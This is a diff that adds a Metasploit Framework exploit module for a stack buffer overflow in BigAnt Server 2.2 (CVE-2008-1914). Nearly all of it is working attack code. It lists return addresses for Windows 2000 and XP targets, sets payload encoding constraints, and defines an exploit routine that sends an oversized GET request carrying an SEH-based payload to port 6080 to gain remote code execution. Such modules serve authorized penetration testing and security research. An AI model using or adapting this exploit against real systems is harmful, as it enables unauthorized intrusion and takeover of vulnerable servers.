@@ -1,0 +1,75 @@
+##
+# $Id: bigant_server.rb 9262 2010-05-09 17:45:00Z jduck $
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = AverageRanking
+
+	include Msf::Exploit::Remote::Tcp
+	include Msf::Exploit::Remote::Seh
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'BigAnt Server 2.2 Buffer Overflow',
+			'Description'    => %q{
+					This module exploits a stack buffer overflow in BigAnt Server 2.2.
+				By sending a specially crafted packet, an attacker may be
+				able to execute arbitrary code.
+			},
+			'Author'         => [ 'MC' ],
+			'License'        => MSF_LICENSE,
+			'Version'        => '$Revision: 9262 $',
+			'References'     =>
+				[
+					[ 'CVE', '2008-1914' ],
+					[ 'OSVDB', '44454' ],
+					[ 'BID', '28795' ],
+				],
+			'Privileged'     => true,
+			'DefaultOptions' =>
+				{
+					'EXITFUNC' => 'process',
+				},
+			'Payload'        =>
+				{
+					'Space'    => 750,
+					'BadChars' => "\x00\x20\x0a\x0d",
+					'StackAdjustment' => -3500,
+					'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,
+					'DisableNops'  =>  'True',
+				},
+			'Platform'       => 'win',
+			'Targets'        =>
+				[
+					[ 'Windows 2000 Pro All English',   { 'Ret' => 0x75022ac4 } ],
+					[ 'Windows XP Pro SP0/SP1 English', { 'Ret' => 0x71aa32ad } ],
+				],
+			'DefaultTarget' => 0,
+			'DisclosureDate' => 'Apr 15 2008'))
+
+		register_options([Opt::RPORT(6080)], self.class)
+	end
+
+	def exploit
+		connect
+
+		sploit =  "GET " + rand_text_alpha_upper(950) + generate_seh_payload(target.ret)
+		sploit << rand_text_alpha_upper(1024 - payload.encoded.length)
+
+		print_status("Trying target #{target.name}...")
+		sock.put(sploit + "\n\n")
+
+		handler
+		disconnect
+	end
+
+end
